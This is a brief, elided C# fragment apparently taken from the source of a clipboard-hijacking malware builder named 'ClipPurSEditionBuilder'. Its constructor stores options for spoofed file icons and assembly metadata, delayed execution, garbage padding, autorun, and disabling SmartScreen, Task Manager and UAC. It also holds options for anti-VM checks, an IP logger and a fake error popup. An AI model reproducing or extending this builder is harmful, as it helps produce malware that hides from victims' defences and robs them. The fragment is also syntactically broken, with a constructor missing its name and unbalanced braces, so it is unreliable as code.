namespace ClipPurSEditionBuilder
{
    ...
    public class Build
    {
        ...
        (
            ...
            CheckBox del, CheckBox garbage, CheckBox auto, CheckBox smart, CheckBox task, CheckBox uac, CheckBox antivm, CheckBox iplogger, CheckBox fake)
            {
              this.BoxIcon = icon; this.BoxFileName = filename; this.AssTitle = title; this.AssDescription = descr;
              this.AssCompany = company; this.AssProduct = product; this.AssCopyright = copy; this.AssVersion = ver;
              this.AssFileVersion = flver; this.GuidBox = guid; this.IPLoGGeR = iplog; this.ErrorBox = error;
              this.BoxStatus = status; this.RunCheckStatus = auto; this.DelayCheckStatus = del; this.GarbageCheckStatus = garbage;
              this.SmartOffCheckStatus = smart; this.TaskMgrOffCheckStatus = task; this.UacOffCheckStatus = uac; this.AntiVMCheckStatus = antivm;
              this.IPLogheckStatus = iplogger; this.FakeErrorCheckStatus = fake;
        }
    }
}